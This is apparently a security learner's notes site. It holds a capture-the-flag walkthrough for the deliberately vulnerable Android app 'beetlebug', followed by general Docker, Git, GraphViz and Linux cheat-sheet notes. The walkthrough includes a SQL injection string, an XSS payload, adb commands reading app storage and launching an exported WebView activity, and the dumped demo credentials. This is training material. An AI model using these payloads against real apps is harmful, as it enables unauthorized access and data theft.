<h2 id="flag-2---hardcoding-secrets"><a class="header" href="#flag-2---hardcoding-secrets">Flag 2 - Hardcoding Secrets</a></h2>
<p>Looking for <code>Enter Promo mode</code>
=&gt; res/layout/activity_embedded_secret_source_code.xml</p>
<pre><code class="language-java">...
public String beetle_bug_shop_promo_code = &quot;beetle1759&quot;;
...
 EmbeddedSecretSourceCode embeddedSecretSourceCode = EmbeddedSecretSourceCode.this;
                embeddedSecretSourceCode.m_price = (TextView) embeddedSecretSourceCode.findViewById(C0670R.C0673id.textViewPrice);
                if (EmbeddedSecretSourceCode.this.m_promo.getText().toString().equals(EmbeddedSecretSourceCode.this.beetle_bug_shop_promo_code)) {
</code></pre>
<h1 id="data-storage"><a class="header" href="#data-storage">Data Storage</a></h1>
<h2 id="flag-3---shared-preferences"><a class="header" href="#flag-3---shared-preferences">Flag 3 - Shared Preferences</a></h2>
<pre><code class="language-shell">$ adb shell
$# cd /data/data/app.beetlebug/shared_prefs/
$# ls -liash
$# ls
flag_scores.xml       # Current Flag value
preferences.xml       # 
shared_pref_flag.xml
user_info.xml
walkthrough.xml
$# cat preferences.xml
&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;
&lt;map&gt;
    &lt;string name=&quot;5_sqlite&quot;&gt;MHgxMTcyYzA0&lt;/string&gt;
    &lt;string name=&quot;11_firebase&quot;&gt;MHgzMzY1QTEw&lt;/string&gt;
    &lt;string name=&quot;13_xss&quot;&gt;MHg2NnI5MjE0&lt;/string&gt;
    &lt;string name=&quot;4_ext_store&quot;&gt;MHgzOTgyYyU0&lt;/string&gt;
    &lt;string name=&quot;8_service&quot;&gt;MHgyMjIxMDNB&lt;/string&gt;
    &lt;string name=&quot;7_content&quot;&gt;MHg3MzM0MjFN&lt;/string&gt;
    &lt;string name=&quot;9_log&quot;&gt;MHg1NTU0MWQz&lt;/string&gt;
    &lt;string name=&quot;16_patch&quot;&gt;MHgzM2U5JGU=&lt;/string&gt;
    &lt;string name=&quot;10_sqli&quot;&gt;MHg5MTMzNFox&lt;/string&gt;
    &lt;string name=&quot;15_fingerprint&quot;&gt;MHg0M0oxMjMm&lt;/string&gt;
    &lt;string name=&quot;6_activity&quot;&gt;MHgzMzRmMjIx&lt;/string&gt;
    &lt;string name=&quot;3_pref&quot;&gt;MHgxNDQyYzA0&lt;/string&gt;
    &lt;string name=&quot;12_url&quot;&gt;MHgzM2YzMzQx&lt;/string&gt;
    &lt;string name=&quot;14_clip&quot;&gt;MHgxMTMyYzQh&lt;/string&gt;
&lt;/map&gt;
$# cat shared_pref_flag.xml
&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;
&lt;map&gt;
    &lt;string name=&quot;password&quot;&gt;    &amp;lt;string name=&amp;quot;flag&amp;quot;&amp;gt;0x32f6641&amp;lt;/string&amp;gt;&amp;#10;    &lt;/string&gt;
    &lt;string name=&quot;flag 3&quot;&gt;0x1442c04&lt;/string&gt;
    &lt;string name=&quot;username&quot;&gt;test&lt;/string&gt;
&lt;/map&gt;
$# # cat user_info.xml
&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;
&lt;map&gt;
    &lt;boolean name=&quot;is_logged_in&quot; value=&quot;true&quot; /&gt;
    &lt;string name=&quot;flag&quot;&gt;0x32f6641&lt;/string&gt;
    &lt;string name=&quot;user_token&quot;&gt;ca9eada3-d132-46d3-8c43-333f3890f6eb&lt;/string&gt;
    &lt;string name=&quot;user&quot;&gt;test&lt;/string&gt;
&lt;/map&gt;
</code></pre>
<p>Pour shared_pref</p>
<p><code>&amp;lt;string name=&amp;quot;flag&amp;quot;&amp;gt;0x32f6641&amp;lt;/string&amp;gt;&amp;#10;</code> =&gt; <code>&lt;string name=&quot;flag&quot;&gt;0x32f6641&lt;/string&gt;</code></p>
<p>But we had to find &quot;Enter Flags'</p>
<ol>
<li>Find activity for <code>Shared PReferences</code> =&gt; <code>res/layout/activity_insecure_storage_sharedpref.xml</code></li>
<li>Rechercher <code>setContentView(C0670R.layout.activity_insecure_storage_sharedpref);</code> =&gt; <code>java_src/app/beetlebug/ctf/InsecureStorageSharedPref.java</code></li>
</ol>
<p>There are a code <code>String pref_result = this.preferences.getString(&quot;3_pref&quot;, &quot;&quot;);</code> =&gt; Ref. dans <code>preferences.xml</code></p>
<pre><code class="language-xml">&lt;string name=&quot;3_pref&quot;&gt;MHgxNDQyYzA0&lt;/string&gt;
</code></pre>
<pre><code class="language-python">from base64 import b64decode;print(b64decode(&quot;MHgxNDQyYzA0&quot;).decode('utf8'))
</code></pre>
<p>=&gt; <code>0x1442c04</code></p>
<h2 id="flag-4---external-storage"><a class="header" href="#flag-4---external-storage">Flag 4 - External Storage</a></h2>
<p>When register new user, a new file will be create:</p>
<blockquote>
<p>/storage/emulated/0/Documents</p>
</blockquote>
<pre><code class="language-shell">$ cat /storage/emulated/0/Documents/user.txt
Pass: 1234
Email: johndoe@antispam.com
flag : 0x3982c%4
</code></pre>
<p>Flag string reference <code>4_ext_store</code></p>
<pre><code class="language-xml">&lt;string name=&quot;4_ext_store&quot;&gt;MHgzOTgyYyU0&lt;/string&gt;
</code></pre>
<pre><code class="language-python">from base64 import b64decode;print(b64decode(&quot;MHgzOTgyYyU0&quot;).decode('utf8'))
</code></pre>
<p><code>0x3982c%4</code></p>
<h2 id="flag-5---sqlite-database"><a class="header" href="#flag-5---sqlite-database">Flag 5 - Sqlite Database</a></h2>
<p>Looking for database</p>
<blockquote>
<p>/data/data/app.beetlebug/databases </p>
</blockquote>
<p><code>user.db</code> =&gt; <code>1	qwer1234!@#$SDFSDF	0x1172c04</code></p>
<p>Flag =&gt; <code>0x1172c04</code>.</p>
<h1 id="webviews"><a class="header" href="#webviews">WebViews</a></h1>
<h2 id="flag-6---load-arbitrary-url"><a class="header" href="#flag-6---load-arbitrary-url">Flag 6 - Load Arbitrary URL</a></h2>
<ul>
<li>Get info with <code>objection</code></li>
</ul>
<pre><code class="language-shell">$ objection app.beetlebug explore
$ env
$ android hooking get current_activity
Activity: app.beetlebug.ctf.WebViewURLActivity
</code></pre>
<ul>
<li>Launch activity with parameters</li>
</ul>
<pre><code class="language-shell">$ adb shell am start -n app.beetlebug/.ctf.WebViewURLActivity --es reg_url &quot;file:///android_asset/pwn.html&quot;
# same as 
$ adb shell am start -n app.beetlebug/app.beetlebug.ctf.WebViewURLActivity --es reg_url &quot;file:///android_asset/pwn.html&quot;
</code></pre>
<p><strong>NOTE</strong></p>
<p>Classic command:</p>
<blockquote>
<p>adb shell am start -n &lt;PACKAGE_NAME/ACTIVITY_CLASS&gt; [EXTRA_DATA]</p>
</blockquote>
<p>Here are the available activities:</p>
<pre><code class="language-text">$ [Objection] android hooking list activities
app.beetlebug.FlagsOverview
app.beetlebug.MainActivity
app.beetlebug.MainActivity$1
app.beetlebug.Walkthrough
app.beetlebug.adapter.SlideViewPagerAdapter
app.beetlebug.adapter.SlideViewPagerAdapter$1
app.beetlebug.adapter.SlideViewPagerAdapter$2
app.beetlebug.ctf.BinaryPatchActivity
app.beetlebug.ctf.WebViewURLActivity
app.beetlebug.ctf.WebViewXSSActivity
app.beetlebug.handlers.VulnerableContentProvider
app.beetlebug.handlers.VulnerableContentProvider$DatabaseHelper
app.beetlebug.home.AndroidComponentsHome
app.beetlebug.home.BiometricFragmentHome
app.beetlebug.home.DatabaseFragmentHome
app.beetlebug.home.InsecureStorageFragmentHome
app.beetlebug.home.SecretsFragmentHome
app.beetlebug.home.SensitiveDataFragmentHome
app.beetlebug.home.WebViewFragmentHome
app.beetlebug.home.WebViewFragmentHome$1
app.beetlebug.home.WebViewFragmentHome$2
app.beetlebug.home.WebViewFragmentHome$3
app.beetlebug.user.PlayerStats
app.beetlebug.user.UserSignUp
</code></pre>
<p>The app name is <code>app.beetlebug</code>, the rest is the activities name:</p>
<pre><code class="language-text">.FlagsOverview
.MainActivity
.MainActivity$1
.Walkthrough
.adapter.SlideViewPagerAdapter
.adapter.SlideViewPagerAdapter$1
.adapter.SlideViewPagerAdapter$2
.ctf.BinaryPatchActivity
.ctf.WebViewURLActivity
.ctf.WebViewXSSActivity
.handlers.VulnerableContentProvider
.handlers.VulnerableContentProvider$DatabaseHelper
.home.AndroidComponentsHome
.home.BiometricFragmentHome
.home.DatabaseFragmentHome
.home.InsecureStorageFragmentHome
.home.SecretsFragmentHome
.home.SensitiveDataFragmentHome
.home.WebViewFragmentHome
.home.WebViewFragmentHome$1
.home.WebViewFragmentHome$2
.home.WebViewFragmentHome$3
.user.PlayerStats
.user.UserSignUp
</code></pre>
<p><strong>NOTE</strong> <code>adb shell am start -n app.beetlebug/app.beetlebug.ctf.WebViewURLActivity --es reg_url &quot;file:///android_asset/pwn.html&quot;</code> cannot be display. Into decompiled APK, <code>assets/pwn.html</code>, there are <code>assets/pwn.png</code></p>
<p>=&gt; <code>adb shell am start -n app.beetlebug/app.beetlebug.ctf.WebViewURLActivity --es reg_url &quot;file:///android_asset/pwn.png</code></p>
<p>=&gt; <code>0x33f3341</code></p>
<h2 id="flag-7---javascript-code-injection-xss"><a class="header" href="#flag-7---javascript-code-injection-xss">Flag 7 - JavaScript Code Injection (XSS)</a></h2>
<p>Write into payload the classic</p>
<pre><code class="language-js">&lt;script&gt;alert(&quot;Hello Worlds&quot;)&lt;/script&gt;
</code></pre>
<p>The flag appears behind the send <code>0x66r9214</code></p>
<h2 id="flag-8---sql-injection"><a class="header" href="#flag-8---sql-injection">Flag 8 - SQL Injection</a></h2>
<p>Try to execute SqlInjection.</p>
<p>The request is something like, to check user:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username='&lt;NAME&gt;'; 
</code></pre>
<p>If we try the following name <code>' or 1=1; -- </code>:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username='' or 1=1; -- '; 
</code></pre>
<p>=&gt;</p>
<pre><code class="language-text">User: (admin) pass: (passwd123) Credit Card: (1234567812345678)
User: (beetle-bug) pass: (flg) Credit Card: (0x91334Z1)
</code></pre>
<p>Flag =&gt; <code>0x91334Z1</code></p>
<h2 id="flag-9---firebase-database-misconfiguration"><a class="header" href="#flag-9---firebase-database-misconfiguration">Flag 9 - Firebase Database Misconfiguration</a></h2>
<div style="break-before: page; page-break-before: always;"></div><pre><code class="language-▄▄▄▄▄       ▄▄▄▄                ██           ▄▄">         █▀▀▀▀██▄    ██▀▀▀                ▀▀           ██           
██▄████        ██  ███████    ██▄████   ████      ▄███▄██   ▄█████▄ 
██▀          ▄█▀     ██       ██▀         ██     ██▀  ▀██   ▀ ▄▄▄██ 
██         ▄█▀       ██       ██          ██     ██    ██  ▄██▀▀▀██ 
██       ▄██▄▄▄▄▄    ██       ██       ▄▄▄██▄▄▄  ▀██▄▄███  ██▄▄▄███ 
▀▀       ▀▀▀▀▀▀▀▀    ▀▀       ▀▀       ▀▀▀▀▀▀▀▀    ▀▀▀ ▀▀   ▀▀▀▀ ▀▀ 
</code></pre>
<ul>
<li>https://github.com/enovella/r2frida-wiki/blob/master/README.md</li>
<li>https://github.com/nowsecure/r2frida</li>
<li>https://r2wiki.readthedocs.io/en/latest/options/a/af/</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="gnirehtet-tethering"><a class="header" href="#gnirehtet-tethering">Gnirehtet (tethering)</a></h1>
<h2 id="usage"><a class="header" href="#usage">Usage</a></h2>
<ul>
<li>Install</li>
</ul>
<pre><code class="language-shell">cd /tmp
wget &quot;https://github.com/Genymobile/gnirehtet/releases/download/v2.3/gnirehtet-rust-linux64-v2.3.zip&quot;
unzip ./gnirehtet-rust-linux64-v2.3.zip
cd gnirehtet-rust-linux64
./gnirehtet install
</code></pre>
<ul>
<li>Run</li>
</ul>
<pre><code class="language-shell">$ ./gnirehtet run
</code></pre>
<h2 id="ref-1"><a class="header" href="#ref-1">Ref.</a></h2>
<ul>
<li>
<p><a href="https://medium.com/genymobile/gnirehtet-reverse-tethering-android-2afacdbdaec7">Introducing “gnirehtet”, a reverse tethering tool for Android</a></p>
</li>
<li>
<p><a href="https://medium.com/genymobile/gnirehtet-2-our-reverse-tethering-tool-for-android-now-available-in-rust-999960483d5a">Gnirehtet 2: our reverse tethering tool for Android now available in Rust</a></p>
</li>
<li>
<p><a href="https://github.com/Genymobile/gnirehtet">Github</a></p>
</li>
<li>
<p><a href="https://blog.rom1v.com/2017/09/gnirehtet-reecrit-en-rust/">Gnirehtet réécrit en Rust</a></p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="docker-1"><a class="header" href="#docker-1">Docker</a></h1>
<ul>
<li><a href="tools/docker/index.html#docker-volumes">Docker volumes</a></li>
<li><a href="tools/docker/index.html#manage-image-size">Manage image size</a></li>
<li><a href="tools/docker/index.html#docker-forensic">Docker Forensic</a></li>
<li><a href="tools/docker/index.html#docker-compose">Docker-compose</a></li>
<li><a href="tools/docker/index.html#to-get-further">To get further</a></li>
</ul>
<pre><code class="language-bash">docker images # list images
docker pull &lt;img:tag&gt; # pull a certain image
docker run -it &lt;img:tag&gt; &lt;command&gt; # run a command in a new container (interactively)

docker ps -as # list all containers
docker exec -it &lt;container-id&gt; &lt;command&gt; # run a command in a running container
docker container prune # delete all containers
docker inspect &lt;container-id&gt; # show low-level info on a container
docker commit &lt;container-id&gt; &lt;repository:tag&gt; # create a new image from container changes

# Networks managing: None, Host, Bridge (default)
docker network create --driver &lt;driver&gt; --subnet x.x.x.x/x --gateway x.x.x.x &lt;network-name&gt; # create a new network
docker network connect &lt;network-name&gt; &lt;container-id&gt; [--ip x.x.x.x] # connect a container to a network (and changing the default ip)
docker rmi $(docker images|grep none|awk '{ print $3 }') # remove docker images with tag or name at none
</code></pre>
<h2 id="docker-volumes"><a class="header" href="#docker-volumes">Docker volumes</a></h2>
<pre class="mermaid">flowchart TB
	A[Container]--bind out --&gt;B
	subgraph B[Filesystem]
	D[ContainerData]
	end
	A--volume --&gt;D
	A--tmpfs mount --&gt;C[Memory]
</pre>
<pre><code class="language-bash">docker volume create &lt;volume-name&gt; # create a volume
docker inspect &lt;volume-name&gt; # to get the mount point on the host
</code></pre>
<pre><code class="language-bash">docker run -itd --mount src=&lt;volume-name&gt;,target=/some/path --name &lt;container-name-to-create&gt; --rm &lt;image-name&gt; # mount a volume on the container
</code></pre>
<h2 id="manage-image-size"><a class="header" href="#manage-image-size">Manage image size</a></h2>
<pre><code class="language-bash">docker image history &lt;image-name&gt; -notrunc # know the size and layers of an image
</code></pre>
<p><a href="tools/docker/./Dockerfile/index.html">Multi-stage Build</a>: allows to reduce the final size of a docker image by performing some operations before creating the final image (e.g. compiling the source code)</p>
<p>Choose your base image:</p>
<ul>
<li>alpine</li>
<li>debian</li>
<li>scratch</li>
<li>busybox:glibc (useful if the program is dynamic)</li>
</ul>
<p><code>C_GO_ENABLED=0</code>: Go doesn't use system libraries anymore but its own implementations so it becomes static (<code>net</code> and <code>dns</code> for example)</p>
<p>Alpine uses musl but there is the possibility to install build-base</p>
<p>The others use glibc. The 2 are not compatible (i.e. compiling on glibc and running on alpine will not work)</p>
<h2 id="docker-forensic"><a class="header" href="#docker-forensic">Docker Forensic</a></h2>
<ul>
<li>
<p>Dive: exploring image, layer, contents</p>
</li>
<li>
<p>LiME: Linux Memory Extractor</p>
</li>
</ul>
<h1 id="docker-compose"><a class="header" href="#docker-compose">Docker-compose</a></h1>
<pre><code class="language-bash">docker-compose up --build -d # run, build and keep detach
docker-compose stop/down
</code></pre>
<h1 id="to-get-further"><a class="header" href="#to-get-further">To get further</a></h1>
<ul>
<li><a href="tools/docker/../kubernetes/index.html">Kubernetes</a></li>
<li>Skaffold</li>
<li>Kustomize</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dockerfile"><a class="header" href="#dockerfile">Dockerfile</a></h1>
<h2 id="multi-stage-build"><a class="header" href="#multi-stage-build">Multi-stage build</a></h2>
<p>Get a minimalist container simply running a binary. This helps keep the running docker container small while still be able to compile a project needing a lot of dependencies.</p>
<pre><code class="language-dockerfile"># Step 1
FROM golang:alpine3.7 as build-env # Create an alias
COPY main.go /hello/main.go
WORKDIR /hello
RUN env GOOS=linux GOARCH=amd64 go build

# Step 2
FROM scratch
COPY --from=build-env /hello/hello /bin/hello # copy the compiled file from the build-env image
ENTRYPOINT [&quot;/bin/hello&quot;]
</code></pre>
<pre><code class="language-bash">docker build -t hello-scratch:v1 . # build your image with the Dockerfile in the current directory
docker images # check you have your newly created image
docker run hello-scratch:v1 # run your image
</code></pre>
<p><a href="https://docs.docker.com/build/building/multi-stage/">Official documentation for the multi-stage</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="git"><a class="header" href="#git">Git</a></h1>
<ul>
<li>Cancel last local commit</li>
</ul>
<pre><code class="language-bash">git reset HEAD~1
</code></pre>
<p>-Remove a file from the index without deleting it</p>
<pre><code class="language-bash">git reset HEAD &lt;filename&gt; # does not delete the file but removes it from the index
</code></pre>
<ul>
<li>Create new branch</li>
</ul>
<pre><code class="language-bash">git branch &lt;branchName&gt; # locally
# upstream branch
git branch --set-upstream-to=origin/&lt;branchName&gt;
git push -u origin &lt;branchName&gt;
</code></pre>
<ul>
<li>Merge some commits together</li>
</ul>
<pre><code class="language-bash">git rebase -i HEAD~X
# X = number of commits to merge
# 1. make your modification
# 2. if commits were already pushed: git push --force
# 3. else: git push
</code></pre>
<ul>
<li>Unstagged files and change active branch</li>
</ul>
<pre><code class="language-bash">git stash push -m &quot;message&quot;
git stash list
git checkout &lt;another branch&gt;
git stash pop
</code></pre>
<ul>
<li>Delete file from git history</li>
</ul>
<pre><code class="language-bash">git filter-branch --index-filter &quot;git rm -rf --cached --ignore-unmatch &lt;path-to-file&gt;&quot; HEAD
git push -all --force
</code></pre>
<ul>
<li>Find file in git history</li>
</ul>
<pre><code class="language-bash">git log --all --full-history -- &lt;path-to-file&gt;
</code></pre>
<ul>
<li>Apply commits on another branch</li>
</ul>
<pre><code class="language-bash">git cherry-pick &lt;commit-hash&gt;
</code></pre>
<ul>
<li>Add &amp; push tags</li>
</ul>
<pre><code class="language-bash">git tag &lt;tag-name&gt;
git push --tags
</code></pre>
<ul>
<li>Use GIT with a GUI</li>
</ul>
<pre><code class="language-bash">gitk --all
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="graphviz"><a class="header" href="#graphviz">GraphViz</a></h1>
<ul>
<li>File to PNG</li>
</ul>
<blockquote>
<p>dot &lt;/path/tp/file/dot&gt; -Tpng -o output.png</p>
</blockquote>
<h2 id="reference-1"><a class="header" href="#reference-1">Reference</a></h2>
<ul>
<li><a href="https://sketchviz.com/graphviz-examples">Sketchviz - Graphviz Examples</a></li>
<li><a href="https://sketchviz.com/flowcharts-in-graphviz">Sketchviz - Guide to Flowcharts in Graphviz</a></li>
<li><a href="https://graphs.grevian.org/example">GraphViz Pocket Reference</a></li>
<li><a href="https://www.graphviz.org/pdf/dotguide.pdf">Drawing graphs with dot (pdf)</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="graphviz-1"><a class="header" href="#graphviz-1">GraphViz</a></h1>
<h2 id="simple-command"><a class="header" href="#simple-command">Simple command</a></h2>
<ul>
<li>With <code>graphiviz</code> python module</li>
</ul>
<pre><code class="language-python">import graphviz

dot_data = &quot;&quot;&quot;
// The Round Table
digraph {
    A [label=&quot;King Arthur&quot;]
    B [label=&quot;Sir Bedevere the Wise&quot;]
    L [label=&quot;Sir Lancelot the Brave&quot;]
    A -&gt; B
    A -&gt; L
    B -&gt; L [constraint=false]
}
&quot;&quot;&quot;
graph = graphviz.Source(dot_data)
graph
</code></pre>
<p><img src="tools/graphviz/examples/./assets/output_1_0.svg" alt="svg" /></p>
<ul>
<li>With command line</li>
</ul>
<pre><code class="language-python">!dot -Tpng ./assets/source.dot -o ./assets/source.png
</code></pre>
<p><img src="tools/graphviz/examples/./assets/output_1_0.svg" alt="image" /></p>
<h2 id="some-examples"><a class="header" href="#some-examples">Some examples</a></h2>
<h2 id="basic"><a class="header" href="#basic">Basic</a></h2>
<ul>
<li>graph</li>
</ul>
<p>No direction</p>
<pre><code class="language-text">graph {
  hello -- world;
}
</code></pre>
<p><img src="tools/graphviz/examples/./assets/basic.png" alt="image" /></p>
<ul>
<li>digraph</li>
</ul>
<p>oriented graph</p>
<pre><code class="language-text">graph {
  hello -&gt; world;
}
</code></pre>
<p><img src="tools/graphviz/examples/./assets/digraph_basic.png" alt="image" /></p>
<ul>
<li>digraph oriented AND edge in color</li>
</ul>
<pre><code class="language-text">digraph {
  rankdir=LR;
  
  hello [ label = &quot;Hello&quot; ];
  hello -&gt; world [ color=&quot;orange&quot;, penwidth=3.0 ];
}
</code></pre>
<p><img src="tools/graphviz/examples/./assets/digraph_color_basic.png" alt="image" /></p>
<ul>
<li>digraph with font</li>
</ul>
<pre><code class="language-text">digraph {
  Tinos [ fontname=&quot;Tinos&quot; ];
  Handlee [ fontname=&quot;Handlee&quot; ];
  &quot;Sedgwick Ave&quot; [ fontname=&quot;Sedgwick Ave&quot; ];
  &quot;*also Sedgwick*&quot;;
}
</code></pre>
<p><img src="tools/graphviz/examples/./assets/digraph_font_basic.png" alt="image" /></p>
<ul>
<li>digraph custom edge</li>
</ul>
<pre><code class="language-text">digraph {
  node [ shape=square ];
  edge [ style=dashed ];
  
  see -&gt; think -&gt; do;
}
</code></pre>
<p><img src="tools/graphviz/examples/./assets/digraph_custom_edge.png" alt="image" /></p>
<h3 id="simple-graph"><a class="header" href="#simple-graph">Simple Graph</a></h3>
<pre><code class="language-graphviz">graph {
    a -- b;
    b -- c;
    c -- d;
    d -- e;
    e -- f;
    a -- f;
    a -- c;
    a -- d;
    a -- e;
    b -- d;
    b -- e;
    b -- f;
    c -- e;
    c -- f;
    d -- f;
}
</code></pre>
<p><img src="tools/graphviz/examples/./assets/output_7_0.png" alt="svg" /></p>
<h3 id="full-digraph"><a class="header" href="#full-digraph">Full digraph</a></h3>
<pre><code class="language-python">import graphviz

dot_data = &quot;&quot;&quot;
digraph {
    a -&gt; b[label=&quot;0.2&quot;,weight=&quot;0.2&quot;];
    a -&gt; c[label=&quot;0.4&quot;,weight=&quot;0.4&quot;];
    c -&gt; b[label=&quot;0.6&quot;,weight=&quot;0.6&quot;];
    c -&gt; e[label=&quot;0.6&quot;,weight=&quot;0.6&quot;];
    e -&gt; e[label=&quot;0.1&quot;,weight=&quot;0.1&quot;];
    e -&gt; b[label=&quot;0.7&quot;,weight=&quot;0.7&quot;];
}
&quot;&quot;&quot;
graphviz.Source(dot_data)
</code></pre>
<p><img src="tools/graphviz/examples/./assets/output_9_0.svg" alt="svg" /></p>
<h3 id="showing-a-path"><a class="header" href="#showing-a-path">Showing A path</a></h3>
<pre><code class="language-python">import graphviz

dot_data = &quot;&quot;&quot;
graph {
    a -- b[color=red,penwidth=3.0];
    b -- c;
    c -- d[color=red,penwidth=3.0];
    d -- e;
    e -- f;
    a -- d;
    b -- d[color=red,penwidth=3.0];
    c -- f[color=red,penwidth=3.0];
}
&quot;&quot;&quot;
graphviz.Source(dot_data)
</code></pre>
<p><img src="tools/graphviz/examples/./assets/output_11_0.svg" alt="svg" /></p>
<h3 id="subgraph"><a class="header" href="#subgraph">Subgraph</a></h3>
<pre><code class="language-python">import graphviz

dot_data = &quot;&quot;&quot;
digraph {
    subgraph cluster_0 {
        label=&quot;Subgraph A&quot;;
        a -&gt; b;
        b -&gt; c;
        c -&gt; d;
    }

    subgraph cluster_1 {
        label=&quot;Subgraph B&quot;;
        a -&gt; f;
        f -&gt; c;
    }
}
&quot;&quot;&quot;
graphviz.Source(dot_data)
</code></pre>
<h3 id="complex-digraph"><a class="header" href="#complex-digraph">Complex digraph</a></h3>
<pre><code class="language-python">import graphviz

dot_data = &quot;&quot;&quot;
digraph G {
    size =&quot;4,4&quot;;
    main [shape=box]; /* this is a comment */
    main -&gt; parse [weight=8];
    parse -&gt; execute;
    main -&gt; init [style=dotted];
    main -&gt; cleanup;
    execute -&gt; { make_string; printf}
    init -&gt; make_string;
    edge [color=red]; // so is this
    main -&gt; printf [style=bold,label=&quot;100 times&quot;];
    make_string [label=&quot;make a\nstring&quot;];
    node [shape=box,style=filled,color=&quot;.7 .3 1.0&quot;];
    execute -&gt; compare;
}
&quot;&quot;&quot;
graphviz.Source(dot_data)
</code></pre>
<p><img src="tools/graphviz/examples/./assets/output_15_0.png" alt="image" /></p>
<h3 id="complex-label"><a class="header" href="#complex-label">Complex label</a></h3>
<pre><code class="language-text">digraph G {
    a -&gt; b -&gt; c;
    b -&gt; d;
    a [shape=polygon,sides=5,peripheries=3,color=lightblue,style=filled];
    c [shape=polygon,sides=4,skew=.4,label=&quot;hello world&quot;]
    d [shape=invtriangle];
    e [shape=polygon,sides=4,distortion=.7];
}
</code></pre>
<p><img src="tools/graphviz/examples/./assets/label.png" alt="image" /></p>
<h3 id="advanced-graphs"><a class="header" href="#advanced-graphs">Advanced Graphs</a></h3>
<h4 id="edge-connection"><a class="header" href="#edge-connection">Edge connection</a></h4>
<p>Use <code>&lt;angle-brackets&gt;</code> to connect edge</p>
<pre><code class="language-text">digraph {
  rankdir=LR;
  node [ shape=record ];

  struct1 [
      label = &quot;a|b|&lt;port1&gt;c&quot;;
  ];
  
  struct2 [
      label = &quot;a|{&lt;port2&gt;b1|b2}|c&quot;;
  ];
  
  struct1:port1 -&gt; struct2:port2 [ label=&quot;xyz&quot; ];
}
</code></pre>
<p><img src="tools/graphviz/examples/./assets/digraph_edge_connection.png" alt="image" /></p>
<h4 id="clusters-or-subgraph"><a class="header" href="#clusters-or-subgraph"><code>Clusters</code> (or <code>subgraph</code>)</a></h4>
<p>You can group related nodes by putting them in a subgraph whose name begins with <code>cluster_</code>.</p>
<pre><code class="language-text">digraph {
  node [ fontname=&quot;Handlee&quot; ];
  subgraph cluster_frontend {
    label=&quot;*Frontend*&quot;;
    React;
    Bootstrap;
  }
      
  subgraph cluster_backend {
    label=&quot;*Backend*&quot;;
    expressjs;
    &quot;aws-sdk&quot;;
  }

  React -&gt; expressjs;
  expressjs -&gt; &quot;aws-sdk&quot;;
}
</code></pre>
<p><img src="tools/graphviz/examples/./assets/digraph_subgraph.png" alt="image" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="some-linux-command"><a class="header" href="#some-linux-command">Some linux command</a></h1>
<h2 id="use-stream-editor-sed"><a class="header" href="#use-stream-editor-sed"><code>Use Stream EDitor</code> (SED)</a></h2>
<h3 id="find-and-replace-text-within-a-file-using-sed-command"><a class="header" href="#find-and-replace-text-within-a-file-using-sed-command">Find and replace text within a file using sed command</a></h3>
<blockquote>
<p>sed -i 's/old-text/new-text/g' input.txt</p>
</blockquote>
<ul>
<li><code>-i</code> to update file pass</li>
<li><code>s</code> is the substitute command of sed for find and replace</li>
<li><code>g</code> means global replace i.e. find all occurrences</li>
</ul>
<blockquote>
<p>sed -i 's/foo/bar/gI' input.txt</p>
</blockquote>
<ul>
<li><code>I</code> to match all cases of foo (foo, FOO, Foo, FoO) add I (capitalized I) option</li>
</ul>
<h2 id="install-oh-my-zsh"><a class="header" href="#install-oh-my-zsh">Install <code>Oh My zsh</code></a></h2>
<p>Convert <a href="https://les-enovateurs.com/oh-my-zsh-installation-rapide-linux">Oh My Zsh – guide complet : installation rapide sous Linux</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="bash-tips"><a class="header" href="#bash-tips">Bash tips</a></h1>
<h2 id="touch-file-into-sub-unexisting-folder"><a class="header" href="#touch-file-into-sub-unexisting-folder">touch file into sub unexisting folder</a></h2>
<pre><code class="language-shell">$ file=&quot;./nested/folder/deep/more.txt&quot;
$ mkdir -p &quot;${file%/*}&quot; &amp;&amp; touch &quot;$file&quot;
</code></pre>
<p>Where</p>
<pre><code class="language-shell">$ file=&quot;./nested/folder/deep/more.txt&quot;
$ echo &quot;${file%/*}&quot; # dirname ${file}
./nested/folder/deep
$ echo &quot;$file&quot;
</code></pre>
<p>Possible function: </p>
<pre><code class="language-shell">$ mktouch() {mkdir -p $(dirname $1) &amp;&amp; touch $1;}
</code></pre>
<h2 id="linux"><a class="header" href="#linux">Linux</a></h2>
<ul>
<li>Root console</li>
</ul>
<blockquote>
<p>sudo -s</p>
</blockquote>
<ul>
<li>IP address</li>
</ul>
<blockquote>
<p>ip a</p>
</blockquote>
<ul>
<li>Route</li>
</ul>
<blockquote>
<p>ip r</p>
</blockquote>
<ul>
<li>History des commande</li>
</ul>
<blockquote>
<p>history
!&lt;history_id&gt;</p>
</blockquote>
<ul>
<li>Process </li>
</ul>
<blockquote>
<p>ps -ef
ps -faux</p>
</blockquote>
<ul>
<li>Process sort by mem </li>
</ul>
<blockquote>
<p>ps -faux --sort %mem</p>
</blockquote>
<ul>
<li>App setup</li>
</ul>
<blockquote>
<p>apt list</p>
</blockquote>
<ul>
<li>App available</li>
</ul>
<blockquote>
<p>apt-cache search nessus</p>
</blockquote>
<ul>
<li>List des repo</li>
</ul>
<blockquote>
<p>sudo nano /etc/apt/sources.list</p>
</blockquote>
<ul>
<li>Server HTTP de partage </li>
</ul>
<blockquote>
<p>python2.7 -m SimpleHTTPServer 8080
python3 -m http.server 8080</p>
</blockquote>
<ul>
<li>Shared data</li>
</ul>
<blockquote>
<p>qr http://0.0.0.0:8080/</p>
</blockquote>
<ul>
<li>Afficher/Comparer les fichiers</li>
</ul>
<table><thead><tr><th>commande</th><th>action</th></tr></thead><tbody>
<tr><td><code>wc fichier</code></td><td>compte le nombre de lignes, de mots, d'octets de fichier</td></tr>
<tr><td><code>cat fichiers</code></td><td>concatène les fichiers</td></tr>
<tr><td><code>more fichier</code></td><td>affiche fichier page après page 'Espace'=page suivante, 'Entrée'=ligne suivante, 'u'=remonter</td></tr>
